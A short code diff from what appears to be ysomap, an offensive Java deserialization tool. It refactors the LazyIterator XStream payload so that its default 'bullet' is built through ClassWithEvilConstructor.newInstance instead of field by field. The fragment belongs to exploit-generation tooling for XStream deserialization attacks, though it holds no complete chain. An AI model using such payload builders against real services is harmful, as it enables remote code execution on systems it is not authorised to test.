@@ -8,8 +8,6 @@ import ysomap.core.serializer.SerializerFactory;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 
-import java.util.Random;
-
 /**
  * @author wh1t3P1g
  * @since 2020/4/17
@@ -29,11 +27,7 @@ public class LazyIterator extends XStreamPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        Bullet bullet =  new ClassWithEvilConstructor();
-        bullet.set("type","class");
-        bullet.set("body",args[0]);
-        bullet.set("classname","pwn"+new Random().nextLong());
-        return bullet;
+        return ClassWithEvilConstructor.newInstance(args);
     }
 
     @Override
